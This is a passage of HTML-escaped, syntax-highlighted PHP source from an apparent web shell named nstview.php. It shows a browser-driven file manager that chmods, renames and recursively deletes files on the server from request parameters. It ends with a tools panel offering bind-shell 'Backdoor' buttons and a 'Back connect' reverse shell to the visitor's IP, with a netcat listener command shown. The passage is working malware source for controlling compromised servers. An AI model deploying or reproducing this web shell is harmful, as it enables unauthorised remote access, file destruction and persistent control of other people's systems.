                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;other2&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;other&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">nowrap</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Execute</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;owner1&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;owner&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;group1&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;group&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;other1&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;other&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;right&quot;</span> <span class="nx">nowrap</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Octal</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_owner&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_group&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_other&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_total&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;777&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;right&quot;</span> <span class="nx">nowrap</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Symbolic</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_owner&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_group&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_other&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_total&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;10&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">p</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="nx">HTML</span><span class="p">;</span>

<span class="k">print</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$chmd</span><span class="o">.</span><span class="s2">&quot;</span>

<span class="s2">&amp;lt;b&amp;gt;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=CHMOD&amp;gt;&amp;lt;/form&amp;gt;</span>
<span class="s2">&amp;lt;/center&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$t_total</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;t_total&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$t_total</span><span class="p">){</span>
<span class="nb">chmod</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$wich_f</span><span class="p">,</span><span class="nv">$t_total</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Now chmod is </span><span class="si">$t_total</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;# BACK&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1"># rename</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;rename&#39;</span><span class="p">]){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;RENAME </span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2"> ?&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;center&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;RENAME&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;u&amp;gt;</span><span class="si">$wich_f</span><span class="s2">&amp;lt;/u&amp;gt;&amp;lt;br&amp;gt;&amp;lt;Br&amp;gt;&amp;lt;B&amp;gt;TO&amp;lt;/B&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=rto size=40 value=&#39;</span><span class="si">$wich_f</span><span class="s2">&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=RENAME&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>

<span class="o">@</span><span class="nv">$rto</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rto&#39;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$rto</span><span class="p">){</span>
<span class="nv">$fr1</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$wich_f</span><span class="p">;</span>
<span class="nv">$fr1</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$fr1</span><span class="p">);</span>
<span class="nv">$to1</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$rto</span><span class="p">;</span>
<span class="nv">$to1</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$to1</span><span class="p">);</span>

<span class="nb">rename</span><span class="p">(</span><span class="nv">$fr1</span><span class="p">,</span><span class="nv">$to1</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;File &amp;lt;br&amp;gt;&amp;lt;b&amp;gt;</span><span class="si">$wich_f</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Renamed to &amp;lt;b&amp;gt;</span><span class="si">$rto</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">3;URL=&quot;</span><span class="o">.</span><span class="nv">$php_self</span><span class="o">.</span><span class="s2">&quot;?d=&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;&amp;rename=1&amp;wich_f=&quot;</span><span class="o">.</span><span class="nv">$rto</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>

<span class="p">}</span>

<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>




<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;deldir&#39;</span><span class="p">]){</span>
<span class="o">@</span><span class="nv">$dir</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];</span>
<span class="k">function</span> <span class="nf">deldir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span>
<span class="p">{</span>
<span class="nv">$handle</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="k">while</span> <span class="p">(</span><span class="k">false</span><span class="o">!==</span><span class="p">(</span><span class="nv">$ff</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))){</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$ff</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$ff</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">){</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$ff</span><span class="s2">&quot;</span><span class="p">)){</span>
<span class="nx">deldir</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$ff</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$ff</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}}}</span>
<span class="o">@</span><span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
<span class="o">@</span><span class="nv">$success</span> <span class="o">=</span> <span class="k">true</span><span class="p">;}</span>
<span class="k">return</span> <span class="o">@</span><span class="nv">$success</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$dir</span><span class="o">=@</span><span class="nv">$dir</span><span class="p">;</span>
<span class="nx">deldir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

<span class="nv">$rback</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;rback&#39;</span><span class="p">];</span>
<span class="o">@</span><span class="nv">$rback</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$rback</span><span class="p">);</span>
<span class="nv">$crb</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$rback</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$crb</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="o">@</span><span class="nv">$x</span><span class="o">.=</span><span class="nv">$rback</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=&#39;</span><span class="si">$php_self</span><span class="s2">?d=&quot;</span><span class="o">.@</span><span class="nv">$x</span><span class="o">.</span><span class="s2">&quot;&#39;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;}</span>


<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;tools&quot;</span><span class="p">){</span>
        <span class="c1"># unix</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/font&amp;gt;</span>
<span class="s2">&amp;lt;table border=1&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td align=center&amp;gt;&amp;lt;b&amp;gt;[Name]&amp;lt;/td&amp;gt;&amp;lt;td align=center&amp;gt;&amp;lt;b&amp;gt;[C]&amp;lt;/td&amp;gt;&amp;lt;td align=center&amp;gt;&amp;lt;b&amp;gt;[Port]&amp;lt;/td&amp;gt;&amp;lt;td align=center&amp;gt;&amp;lt;b&amp;gt;[Perl]&amp;lt;/td&amp;gt;&amp;lt;td align=center&amp;gt;&amp;lt;b&amp;gt;[Port]&amp;lt;/td&amp;gt;&amp;lt;td align=center&amp;gt;&amp;lt;b&amp;gt;[Other options, info]&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;Backdoor:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=c_bd value=&#39;Start&#39; style=&#39;background-color:green;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5545&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=perl_bd value=&#39;Start&#39; style=&#39;background-color:green;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port value=5551 size=6&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;none&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;Back connect:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; name=bc_c style=&#39;background-color:green;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port_c size=6 value=5546&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; name=port_p disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port value=5552 size=6&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;b.c. ip: &amp;lt;input name=ip value=&#39;&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; nc -l -p &amp;lt;i&amp;gt;5546&amp;lt;/i&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/tr&amp;gt;</span>
